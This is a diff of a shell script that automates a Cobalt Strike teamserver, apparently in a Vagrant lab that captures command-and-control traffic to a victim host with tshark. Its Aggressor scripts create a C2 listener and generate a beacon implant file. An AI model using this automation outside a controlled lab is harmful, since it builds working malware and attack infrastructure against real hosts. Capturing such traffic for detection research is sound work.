@@ -11,17 +11,16 @@ sleep 20  # wait for teamserver starting
 
 cat << EOF > /tmp/listener.cna
 on ready {
-  listener_create_ext("my listener", "$payload", %(host => "$ts_host", port => $ts_port));
-  println("Existing listeners:");
-  printAll(listeners());
+  listener_create_ext("$listener_name", "$payload", %(host => "$ts_host", port => $ts_port, beacons => "$ts_host"));
+  println(formatDate("yyyy.MM.dd HH:mm:ss z") . " Existing listeners: " . listeners());
 }
 
 on beacon_initial {
-  println("A beacon initialized!");
+  println(formatDate("yyyy.MM.dd HH:mm:ss z") . " Beacon initialized!");
 }
 
 on beacon_checkin {
-  println("A beacon checkin!");
+  println(formatDate("yyyy.MM.dd HH:mm:ss z") . " Beacon checkin!");
 }
 EOF
 
@@ -35,16 +34,18 @@ cat << 'EOF' > /tmp/beacon.cna
 on ready {
   println("Existing listeners:");
   printAll(listeners());
-  $$data = payload("my listener", "$arch", "process", "Direct");
+  $$data = artifact_payload("$listener_name", "$beacon_format", "$arch", "process", "None");
   $$handle = openf(">/vagrant/data/$beacon_file");
   writeb($$handle, $$data);
   closef($$handle);
+  println(formatDate("yyyy.MM.dd HH:mm:ss z") . " Beacon " . "$beacon_file" . " created successfully!")
+  closeClient();
 }
 EOF
 
 # tmux new-window -t collector -n beacon './agscript $ts_host 50050 bob $ts_password /tmp/beacon.cna &> /tmp/beacon.log'
-tmux new-window -t collector -n beacon './agscript $ts_host 50050 bob $ts_password /tmp/beacon.cna'
 echo "Generating beacon ..."
+tmux new-window -t collector -n beacon './agscript $ts_host 50050 bob $ts_password /tmp/beacon.cna'
 
 tmux new-window -t collector -n tshark 'tshark -i $server_nic -f "tcp and host $victim_host" -c $packet_cnt -w /vagrant/data/$pcap_file_name'
 
